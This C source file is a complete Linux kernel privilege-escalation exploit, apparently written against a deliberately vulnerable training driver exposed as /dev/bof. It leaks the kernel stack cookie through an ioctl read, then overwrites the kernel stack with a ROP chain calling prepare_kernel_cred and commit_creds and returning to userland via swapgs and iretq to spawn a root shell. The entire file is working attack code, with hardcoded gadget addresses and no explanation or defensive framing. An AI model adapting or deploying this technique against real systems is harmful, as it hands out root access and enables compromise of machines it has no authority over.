#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define WRITE_STACK 0
#define READ_STACK 1

#define MAX_MSG 1024

typedef struct read_write_stack{
	unsigned long size;
	long msg[MAX_MSG];
} read_write_stack;

void spawn_shell(){
    printf("[+] Returned to userland, spawning root shell...\n");
    if(getuid() == 0){
        printf("[+] Privilege level successfully escalated, spawning shell...\n");
	char *arg[2] = {"/bin/sh", NULL};
        execve("/bin/sh", arg, NULL);
	exit(0);
    }else{
        printf("[-] Failed to escalate privileges, exiting...\n");
        exit(-1);
    }
}

unsigned long user_cs, user_ss, user_sp, user_rflags;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;" // setting intel syntax
        "mov user_cs, cs;" // saving address of code segment
        "mov user_ss, ss;" // saving address of stack segment
        "mov user_sp, rsp;" // saving stack pointer
        "pushf;" // push flag register onto stack
        "pop user_rflags;" // saving flag register
        ".att_syntax;"        
    );
}

unsigned long user_rip = (unsigned long)spawn_shell;

unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
unsigned long prepare_kernel_cred = 0xffffffff8108c240;
unsigned long pop_rdx_ret = 0xffffffff8101c946; // pop rdx; ret;
unsigned long cmp_rdx_8_jne_ret = 0xffffffff81aa2871; // cmp rdx, 8; jne; ret;
unsigned long mov_rdi_rax_jne_xor_ret = 0xffffffff813e52e4; // mov rdi, rax; jne; xor eax, eax; ret;
unsigned long commit_creds = 0xffffffff8108be00;
unsigned long swapgs_nop3_xor_ret = 0xffffffff81c01036; // swapgs; nop x 3; xor; ret;
unsigned long iretq = 0xffffffff810261db; // iretq

int main(){
	int fd;
	long ret;

	printf("[+] Opening device file...\n");
	fd = open("/dev/bof", O_RDWR);
	if(fd < 0){
		printf("[-] Failed to open device file\n");
		exit(-1);
	}

	read_write_stack* receiver = (read_write_stack*)malloc(sizeof(unsigned long) + MAX_MSG * sizeof(long));
	receiver->size = 280;

	printf("[+] Trying to read from kernel stack...\n");
	ret = ioctl(fd, READ_STACK, (unsigned long)receiver);
	if(ret < 0){
		printf("[-] Failed to read from kernel stack\n");
		free(receiver);
		exit(-1);
	}

	printf("[+] Received message\n");
	printf("[+] Stack cookie: 0x%lx\n", receiver->msg[128]);
    
    printf("[+] Saving state...\n");
    save_state();

    long stack_cookie = receiver->msg[128];

    long dummy = 0x4444444444444444;
    long msg[145];
    int off = 128;

    for(int i = 0; i < 128;i++){
        msg[i] = 0x4141414141414141;
    }

    receiver->size = 145 * 2;

    msg[off++] = stack_cookie;
    msg[off++] = dummy;
    msg[off++] = pop_rdi_ret; // pop rdi; ret;
    msg[off++] = 0; // to rdi
    msg[off++] = prepare_kernel_cred;
    msg[off++] = pop_rdx_ret; // pop rdx; ret;
    msg[off++] = 8; // to rdx
    msg[off++] = cmp_rdx_8_jne_ret; // cmp rdx, 8; jne; ret;
    msg[off++] = mov_rdi_rax_jne_xor_ret; // mov rdi, rax; jne; xor eax, eax; ret;
    msg[off++] = commit_creds;
    msg[off++] = swapgs_nop3_xor_ret; // swapgs; ret;
    msg[off++] = iretq;
    msg[off++] = user_rip;
    msg[off++] = user_cs;
    msg[off++] = user_rflags;
    msg[off++] = user_sp;
    msg[off++] = user_ss;
    

    for(int i = 0; i < 145; i++){
        receiver->msg[i] = msg[i];
    }


    printf("[+] Sending payload...\n");

    ret = ioctl(fd, WRITE_STACK, (unsigned long)receiver);
    if(ret < 0){
        printf("[-] Failed to write to kernel stack\n");
        free(receiver);
        exit(-1);
    }    



	free(receiver);
	return 0;
}
